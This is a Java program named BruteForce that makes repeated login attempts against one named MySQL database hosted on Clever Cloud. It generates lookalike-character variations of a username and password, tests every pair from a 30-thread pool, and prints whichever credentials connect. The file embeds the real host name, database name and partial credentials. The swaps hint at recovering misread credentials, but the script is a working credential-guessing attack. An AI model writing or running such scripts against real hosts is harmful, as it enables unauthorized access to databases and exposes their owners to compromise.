package com.flexzone;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

public class BruteForce {
    private static final String host = "bw91k5yvi9zoqz3si326-mysql.services.clever-cloud.com";
    private static final String database = "bw91k5yvi9zoqz3si326";
    private static final String url = "jdbc:mysql://" + host + ":3306/" + database + "?useSSL=false&serverTimezone=UTC&allowPublicKeyRetrieval=true";
    
    private static final AtomicBoolean found = new AtomicBoolean(false);
    private static final AtomicInteger count = new AtomicInteger(0);

    public static void main(String[] args) {
        String[] users = {
            "uwn6eas4ot1wu2b0",
            "uwn6eas4otlwu2b0",
            "uwn6eas40t1wu2b0",
            "uwn6eas40tlwu2b0"
        };
        
        char[] choices = {'I', 'l', '1', 'i'};
        char[] bChoices = {'B', 'b'};
        char[] kChoices = {'k', 'K'};
        char[] uChoices = {'u', 'v'};
        char[] gChoices = {'g', '9', 'q'};
        
        List<String[]> tasks = new ArrayList<>();
        
        // Generate password variations
        for (String user : users) {
            for (char b : bChoices) {
                for (char p1 : choices) {
                    for (char p2 : choices) {
                        for (char p3 : choices) {
                            for (char k : kChoices) {
                                for (char u : uChoices) {
                                    for (char g : gChoices) {
                                        String pwd = "" + b + "n7jh23" + p1 + "u9N" + p2 + "A" + p3 + "JHM" + u + g + k;
                                        tasks.add(new String[]{user, pwd});
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        
        System.out.println("Generated " + tasks.size() + " combinations to test.");
        
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
        } catch (ClassNotFoundException e) {
            System.err.println("Driver not found: " + e.getMessage());
            return;
        }
        
        ExecutorService executor = Executors.newFixedThreadPool(30);
        
        for (String[] task : tasks) {
            executor.submit(() -> {
                if (found.get()) return;
                
                String user = task[0];
                String pwd = task[1];
                
                int currentCount = count.incrementAndGet();
                if (currentCount % 100 == 0) {
                    System.out.println("Tested " + currentCount + " combinations...");
                }
                
                try (Connection conn = DriverManager.getConnection(url, user, pwd)) {
                    if (found.compareAndSet(false, true)) {
                        System.out.println("\nSUCCESS!!! Connected successfully!");
                        System.out.println("User: " + user);
                        System.out.println("Password: " + pwd);
                        executor.shutdownNow();
                    }
                } catch (SQLException e) {
                    if (e.getErrorCode() != 1045) {
                        System.out.println("Other error for " + user + " / " + pwd + ": " + e.getMessage());
                    }
                }
            });
        }
        
        executor.shutdown();
        try {
            executor.awaitTermination(1, TimeUnit.HOURS);
        } catch (InterruptedException e) {
            System.err.println("Execution interrupted.");
        }
        
        if (!found.get()) {
            System.out.println("Finished! No working credentials found.");
        }
    }
}
